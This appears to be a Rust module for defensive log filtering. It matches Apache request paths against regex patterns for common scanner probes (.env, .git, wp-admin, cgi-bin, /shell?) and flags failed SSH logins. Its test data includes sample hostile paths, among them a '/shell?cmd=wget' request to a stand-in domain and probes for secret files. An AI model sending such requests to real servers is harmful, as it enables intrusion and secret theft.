use regex::Regex;
use std::sync::LazyLock;

static BAD_APACHE_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // .env files
        Regex::new(r"(?i)\.env(\.[A-Za-z0-9_-]+)?").unwrap(),
        // Suspicious extensions
        Regex::new(r"(?i)\.(php[0-9]*|env|zip|rsp|aspx|asp[0-9]*|jsp[0-9]*|cgi|xml)(\?|$)")
            .unwrap(),
        // Suspicious directories
        Regex::new(r"(?i)/(service/api-docs|cgi-bin/.*|wp-[^/\s]+.*|solr.*|\.git(/.*)?$|evox.*)")
            .unwrap(),
        // RCE-style requests
        Regex::new(r"(?i)/shell\?").unwrap(),
        // InfluxDB-like query scans
        Regex::new(r"(?i)/query\?").unwrap(),
    ]
});

pub fn is_bad_apache(path: &str) -> bool {
    BAD_APACHE_PATTERNS.iter().any(|re| re.is_match(path))
}

#[cfg(test)]
mod tests {
    use super::is_bad_apache;

    #[test]
    fn test_bad_paths() {
        let bad_paths = [
            "/.env",
            "/.env/beep",
            "/.env/beep/boop",
            "/test.php",
            "/test.php0",
            "/test.php1",
            "/test.php4",
            "/test.php9",
            "/cgi-bin/ls",
            "/wp-admin/install.php",
            "/solr/select?q=*",
            "/.git/config",
            "/.git",
            "/shell?cmd=wget http://bad-domain.com",
            "/query?q=SELECT+*+FROM+users",
            "/service/api-docs",
        ];
        for path in bad_paths {
            assert!(is_bad_apache(path), "Should match: {}", path);
        }
    }
}

pub fn is_bad_ssh(path: &str) -> bool {
    path.contains("Failed password") || path.contains("Invalid user")
}
